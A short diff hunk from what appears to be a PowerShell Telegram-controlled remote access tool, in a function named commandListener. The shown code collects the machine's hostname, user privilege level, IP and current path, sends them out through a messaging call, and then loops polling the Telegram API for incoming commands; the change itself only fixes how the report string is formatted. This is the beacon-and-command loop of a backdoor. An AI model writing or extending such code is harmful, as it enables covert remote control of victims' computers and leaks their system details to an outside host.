@@ -195,7 +195,8 @@ function commandListener
         $_path  = (Get-Location).Path
         $_user  = checkAdminRights
         $_host  = $env:COMPUTERNAME
-        sendMessage "{0} ({1}) - IP:{2} - [{3}]" -f $_host, $_user, $_ip, $_path
+        $_body  = '{0} ({1}) - IP:{2} - [{3}]' -f $_host, $_user, $_ip, $_path
+        sendMessage $_body
         while (Invoke-RestMethod -Method Get "api.telegram.org") 
         {
             $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates
